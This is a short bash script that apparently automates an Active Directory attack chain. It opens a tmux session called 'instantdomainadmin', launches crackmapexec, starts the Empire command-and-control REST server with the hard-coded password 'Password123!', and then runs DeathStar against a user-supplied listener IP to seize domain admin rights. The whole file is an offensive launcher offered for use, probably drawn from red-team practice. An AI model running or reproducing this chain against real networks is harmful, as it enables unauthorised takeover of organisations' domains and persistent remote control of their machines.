#!/bin/bash
HOSTIP=$1
if  [[ -z "$HOSTIP" ]]; then
    echo -e "\n"
    read -p "Host IP (192.168.1.20): " HOSTIP
fi
tmux new-session -d -s instantdomainadmin ;
tmux send-keys -t instantdomainadmin "crackmapexec | less "  C-m
tmux new-window \;
tmux split-window -h ;
tmux select-pane -L
tmux send-keys -t instantdomainadmin "cd /opt/Empire && ./empire --rest --username empireadmin --password Password123!" C-m
tmux select-pane -R
tmux send-keys -t instantdomainadmin "sleep 10 && cd /opt/DeathStar && python3 ./DeathStar.py -u empireadmin -p Password123! -lip $HOSTIP"  C-m
tmux attach-session -d -t instantdomainadmin
